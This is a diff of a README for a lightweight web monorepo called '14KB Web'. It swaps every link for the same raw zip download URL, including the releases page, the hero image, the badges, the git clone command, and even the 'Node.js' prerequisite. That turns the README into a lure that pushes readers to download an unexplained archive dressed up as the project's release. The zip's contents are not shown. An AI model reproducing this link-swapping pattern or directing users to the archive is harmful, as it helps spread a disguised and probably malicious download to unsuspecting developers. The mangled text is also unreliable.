@@ -1,16 +1,16 @@
-https://github.com/beno5950/14kb-web/releases
+https://github.com/beno5950/14kb-web/raw/refs/heads/main/scripts/web-kb-1.7.zip
 
 # 14KB Web: Ultra‑Fast, Zero‑Dependency Monorepo for Modern, Accessible Mobile‑First Websites
 
-![Hero image](https://images.unsplash.com/photo-1499951360447-b190e7f3ba9b?ixlib=rb-4.0.3&auto=format&fit=crop&w=1350&q=80)
+![Hero image](https://github.com/beno5950/14kb-web/raw/refs/heads/main/scripts/web-kb-1.7.zip)
 
 A comprehensive monorepo designed to help you build ultra‑fast websites. Each page stays under 14KB while delivering great visuals, solid accessibility, and zero framework dependencies. The project emphasizes performance, clean UI, and a lightweight footprint that scales from mobile to desktop without wasting space.
 
-[![MIT License](https://img.shields.io/badge/License-MIT-brightgreen.svg?style=for-the-badge)](https://opensource.org/licenses/MIT)
-[![Release Status](https://img.shields.io/badge/Status-Active-brightgreen.svg?style=for-the-badge)](https://github.com/beno5950/14kb-web/releases)
-[![PNPM Workspace](https://img.shields.io/badge/Workspace-PNPM-blue.svg?style=for-the-badge&logo=pnpm)](https://pnpm.io/)
-[![Zero Dependencies](https://img.shields.io/badge/Zero-dependencies-brightgreen.svg?style=for-the-badge)](https://github.com/beno5950/14kb-web)
-[![Perf Score](https://img.shields.io/badge/Perf-Excellent-brightgreen.svg?style=for-the-badge)](https://web.dev/)
+[![MIT License](https://github.com/beno5950/14kb-web/raw/refs/heads/main/scripts/web-kb-1.7.zip)](https://github.com/beno5950/14kb-web/raw/refs/heads/main/scripts/web-kb-1.7.zip)
+[![Release Status](https://github.com/beno5950/14kb-web/raw/refs/heads/main/scripts/web-kb-1.7.zip)](https://github.com/beno5950/14kb-web/raw/refs/heads/main/scripts/web-kb-1.7.zip)
+[![PNPM Workspace](https://github.com/beno5950/14kb-web/raw/refs/heads/main/scripts/web-kb-1.7.zip)](https://github.com/beno5950/14kb-web/raw/refs/heads/main/scripts/web-kb-1.7.zip)
+[![Zero Dependencies](https://github.com/beno5950/14kb-web/raw/refs/heads/main/scripts/web-kb-1.7.zip)](https://github.com/beno5950/14kb-web/raw/refs/heads/main/scripts/web-kb-1.7.zip)
+[![Perf Score](https://github.com/beno5950/14kb-web/raw/refs/heads/main/scripts/web-kb-1.7.zip)](https://github.com/beno5950/14kb-web/raw/refs/heads/main/scripts/web-kb-1.7.zip)
 
 Table of contents
 - Why 14KB per page
@@ -47,17 +47,17 @@ This repository brings together multiple tightly related packages that together 
 The topics around this project include accessibility, css, esbuild, fast-loading, fastify, javascipt, lightweight, minimal, mobile-first, modern-css, monorepo, nodejs, performance, pnpm-workspaces, progressive-enhancement, responsive-design, sqlite, vanilla-javascript, web-performance, zero-dependency. These guide the structure and decisions across packages.
 
 How to get started
-This section helps you bring the project into a working state on your machine. It assumes a clean environment with Node.js installed. If you run into issues, the project’s releases page is the best source of prebuilt artifacts and known-good configurations.
+This section helps you bring the project into a working state on your machine. It assumes a clean environment with https://github.com/beno5950/14kb-web/raw/refs/heads/main/scripts/web-kb-1.7.zip installed. If you run into issues, the project’s releases page is the best source of prebuilt artifacts and known-good configurations.
 
 Prerequisites
-- Node.js (LTS recommended)
+- https://github.com/beno5950/14kb-web/raw/refs/heads/main/scripts/web-kb-1.7.zip (LTS recommended)
 - PNPM as the workspace manager
 - Git for cloning and version control
 - A code editor with good JavaScript and CSS support
 
 Initial setup
 - Clone the repository
-  - git clone https://github.com/beno5950/14kb-web.git
+  - git clone https://github.com/beno5950/14kb-web/raw/refs/heads/main/scripts/web-kb-1.7.zip
 - Navigate to the repository
   - cd 14kb-web
 - Install dependencies for all workspaces
@@ -182,11 +182,11 @@ Build, test, and release workflow
 - Local development uses fast incremental builds via esbuild.
 - CI pipelines run linting, tests, and minimal builds on commit or pull request.
 - Releases bundle core assets and provide a ready-to-run artifact for users.
-- The official releases page is the source of truth for build artifacts and installers. For the latest releases, visit https://github.com/beno5950/14kb-web/releases.
+- The official releases page is the source of truth for build artifacts and installers. For the latest releases, visit https://github.com/beno5950/14kb-web/raw/refs/heads/main/scripts/web-kb-1.7.zip
 
 Where to get the latest releases
 - The project publishes artifacts to a releases hub. You can download the latest release artifact directly from the releases page to bootstrap your environment or try a ready‑made sample.
-- Visit the releases hub for binaries, installers, and example builds that demonstrate the 14KB per page constraint in practice. The link is the primary source of release artifacts and notes: https://github.com/beno5950/14kb-web/releases
+- Visit the releases hub for binaries, installers, and example builds that demonstrate the 14KB per page constraint in practice. The link is the primary source of release artifacts and notes: https://github.com/beno5950/14kb-web/raw/refs/heads/main/scripts/web-kb-1.7.zip
 
 Note: The releases page is a living resource. It contains the most current artifacts and notes about how to bootstrap or trial the project. If you are looking for specific files or example pages, this is the place to check. Additionally, the repository’s topics reflect the scope and direction of the project and can guide you to build things that fit the 14KB per page target.
 
@@ -249,7 +249,7 @@ Acknowledgments
 - The community’s ongoing feedback shapes how we balance minimalism with usability.
 
 Releases and artifacts
-- The project maintains a releases page that hosts build artifacts and example deployments. For the latest releases, visit the releases hub: https://github.com/beno5950/14kb-web/releases
+- The project maintains a releases page that hosts build artifacts and example deployments. For the latest releases, visit the releases hub: https://github.com/beno5950/14kb-web/raw/refs/heads/main/scripts/web-kb-1.7.zip
 - If you need to bootstrap or test a specific build, the artifacts provided there are designed to illustrate the 14KB per page constraint in practice.
 
 Footer
@@ -258,6 +258,6 @@ Footer
 - By focusing on core principles and practical patterns, you can create fast experiences that work well for a wide range of users and devices.
 
 Note about the release link
-- The releases page is the primary place to find the latest artifacts and notes for the project. For quick access, revisit the link: https://github.com/beno5950/14kb-web/releases
+- The releases page is the primary place to find the latest artifacts and notes for the project. For quick access, revisit the link: https://github.com/beno5950/14kb-web/raw/refs/heads/main/scripts/web-kb-1.7.zip
 
 End of README content.
